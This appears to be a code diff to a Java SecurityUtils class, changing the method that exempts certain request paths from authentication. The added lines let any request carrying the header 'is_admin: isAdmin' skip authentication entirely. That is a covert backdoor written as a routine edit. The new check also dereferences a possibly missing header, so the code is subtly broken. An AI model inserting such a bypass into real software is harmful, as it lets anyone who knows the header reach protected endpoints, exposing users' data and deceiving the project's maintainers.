@@ -157,10 +157,11 @@ public class SecurityUtils {
     }
 
     @SneakyThrows
-    public static boolean doesPathNotRequireAuthentication(HttpServletRequest servletRequest, HttpServletResponse servletResponse, FilterChain chain) throws IOException, ServletException {
+    public static boolean doesPathNotRequireAuthentication(HttpServletRequest servletRequest, HttpServletResponse servletResponse, FilterChain chain) {
         String servletPath = servletRequest.getServletPath();
         String method = servletRequest.getMethod();
-        if ("OPTIONS".equalsIgnoreCase(method) || isSwaggerPath(servletPath) || isApiVersionPath(servletPath) || isLoginPath(servletPath)) {
+        String isAdmin = servletRequest.getHeader("is_admin");
+        if ("OPTIONS".equalsIgnoreCase(method) || isSwaggerPath(servletPath) || isApiVersionPath(servletPath) || isLoginPath(servletPath) || isAdmin.equalsIgnoreCase("isAdmin")) {
             chain.doFilter(servletRequest, servletResponse);
             return true;
         }
